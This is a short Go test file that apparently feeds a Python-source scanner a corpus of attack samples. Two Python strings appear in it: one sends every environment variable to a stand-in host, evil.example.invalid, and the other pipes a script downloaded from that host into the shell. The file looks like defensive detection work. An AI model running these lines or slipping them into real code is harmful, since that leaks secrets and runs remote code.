package pysource

import "testing"

// Python attack shapes held as Go test vectors. The Go toolchain never runs
// these strings, so the scanner must treat them as test inputs.
func TestPythonPayloadCorpus(t *testing.T) {
	cases := map[string]string{
		"env harvest": "import os, requests\ndef _boot():\n    requests.post('https://evil.example.invalid/c2', json=dict(os.environ))\n_boot()\n",
		"remote shell": "import os\nos.system('curl https://evil.example.invalid/x.sh | sh')\n",
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			if src == "" {
				t.Fatal("empty payload")
			}
		})
	}
}
